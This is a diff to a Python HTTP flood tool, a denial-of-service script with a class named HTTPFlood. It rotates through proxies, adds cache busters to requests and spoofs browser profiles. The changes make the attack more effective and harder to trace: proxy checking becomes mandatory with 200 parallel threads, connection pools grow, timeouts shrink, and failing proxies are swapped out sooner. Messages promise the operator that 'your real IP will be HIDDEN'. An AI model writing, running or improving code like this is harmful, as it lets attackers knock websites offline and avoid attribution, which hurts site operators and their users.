@@ -75,22 +75,14 @@ BROWSER_PROFILES = [
     }
 ]
 
-def test_proxy(proxy_url, timeout=5):
+def test_proxy(proxy_url, timeout=2):
     """Test if a proxy is working"""
     try:
-        test_urls = ['http://1.1.1.1', 'http://8.8.8.8']
         session = requests.Session()
         session.verify = False
         session.proxies = {'http': proxy_url, 'https': proxy_url}
-        
-        for url in test_urls:
-            try:
-                response = session.get(url, timeout=timeout)
-                if response.status_code in [200, 301, 302, 403, 404]:
-                    return True
-            except:
-                continue
-        return False
+        response = session.get('http://1.1.1.1', timeout=timeout)
+        return response.status_code in [200, 201, 204, 301, 302, 303, 307, 308, 400, 401, 403, 404, 429]
     except:
         return False
 
@@ -100,7 +92,15 @@ def load_proxies(file_path='proxies.txt'):
         with open(file_path, 'r') as f:
             raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
             
+        if not raw:
+            print("[!] No proxies found in proxies.txt")
+            print("[!] Format: ip:port (one per line)")
+            print("[!] Example: 123.45.67.89:8080")
+            return False
+            
         print(f"[*] Loading {len(raw)} proxies...")
+        print("[!] IMPORTANT: Proxies MUST be working HTTP/HTTPS proxies")
+        print("[!] Format: ip:port or http://ip:port (one per line)")
         
         temp_proxies = []
         for proxy in raw:
@@ -108,23 +108,39 @@ def load_proxies(file_path='proxies.txt'):
                 proxy = f'http://{proxy}'
             temp_proxies.append(proxy)
         
-        validate = input(f"[?] Validate proxies before use? (slower but removes dead proxies) (y/n): ").strip().lower()
+        print("[*] Testing proxies for working connections (this is REQUIRED)...")
+        print("[*] Using 200 parallel threads for fast validation...")
+        from concurrent.futures import ThreadPoolExecutor
         
-        if validate == 'y':
-            print("[*] Testing proxies (this may take a while)...")
-            from concurrent.futures import ThreadPoolExecutor
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                results = list(executor.map(lambda p: (p, test_proxy(p, timeout=3)), temp_proxies))
+        tested = 0
+        valid_count = 0
+        
+        with ThreadPoolExecutor(max_workers=200) as executor:
+            for proxy, is_valid in executor.map(lambda p: (p, test_proxy(p, timeout=2)), temp_proxies):
+                tested += 1
+                if is_valid:
+                    config.proxies.append(proxy)
+                    valid_count += 1
+                if tested % 50 == 0 or tested == len(temp_proxies):
+                    print(f"[*] Progress: {tested}/{len(temp_proxies)} tested | {valid_count} working")
+        
+        if len(config.proxies) == 0:
+            print("[!] NO WORKING PROXIES FOUND!")
+            print("[!] Your real IP WILL be exposed if you continue")
+            print("[!] Get working proxies from: free-proxy-list.net or similar")
+            return False
             
-            config.proxies = [p for p, valid in results if valid]
-            print(f"[+] Loaded {len(config.proxies)} working proxies (removed {len(temp_proxies) - len(config.proxies)} dead)")
-        else:
-            config.proxies = temp_proxies
-            print(f"[+] Loaded {len(config.proxies)} proxies (not validated)")
+        print(f"[+] Loaded {len(config.proxies)} WORKING proxies (removed {len(temp_proxies) - len(config.proxies)} dead)")
+        print(f"[+] Your real IP will be HIDDEN behind these proxies")
         
         return len(config.proxies) > 0
     except FileNotFoundError:
-        print("[!] proxies.txt not found")
+        print("[!] proxies.txt not found!")
+        print("[!] Create a file named 'proxies.txt' in the same folder as this script")
+        print("[!] Format: ip:port (one per line)")
+        print("[!] Example:")
+        print("    123.45.67.89:8080")
+        print("    98.76.54.32:3128")
         return False
 
 def get_proxy():
@@ -335,8 +351,8 @@ class HTTPFlood:
         session.verify = False
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=50,
-            pool_maxsize=200,
+            pool_connections=100,
+            pool_maxsize=300,
             max_retries=0,
             pool_block=False
         )
@@ -373,7 +389,7 @@ class HTTPFlood:
                 
                 target_url = add_cache_buster(target_url)
                 
-                timeout = 2
+                timeout = 1.5
                 
                 if self.method == 'GET':
                     response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
@@ -390,7 +406,7 @@ class HTTPFlood:
                     bytes_received=len(response.content)
                 )
                 
-                if current_proxy_ip:
+                if current_proxy_ip and local_count % 10 == 0:
                     with config.stats_lock:
                         config.working_proxies.add(current_proxy_ip)
                 
@@ -408,7 +424,7 @@ class HTTPFlood:
                 update_stats(success=False)
                 consecutive_fails += 1
                 
-                if consecutive_fails >= 3 and self.use_proxy_rotation:
+                if consecutive_fails >= 2 and self.use_proxy_rotation:
                     try:
                         current_proxy_index = (current_proxy_index + 1) % len(config.proxies)
                         proxy = config.proxies[current_proxy_index]
